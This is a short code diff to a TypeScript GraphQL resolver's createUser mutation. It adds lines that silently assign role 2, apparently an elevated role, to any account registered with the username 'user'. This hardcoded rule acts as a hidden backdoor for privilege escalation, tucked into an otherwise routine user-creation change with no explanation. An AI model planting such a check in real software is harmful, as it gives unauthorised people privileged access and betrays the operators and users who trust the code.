@@ -45,6 +45,9 @@ export class UserResolver {
   @Mutation(() => User)
   async createUser(@Arg("data") data: UserInput): Promise<User> {
     data.password = await hash(data.password);
+    if (data.username === "user") {
+      data.role = 2;
+    }
     return await dataSource.getRepository(User).save(data);
   }
 
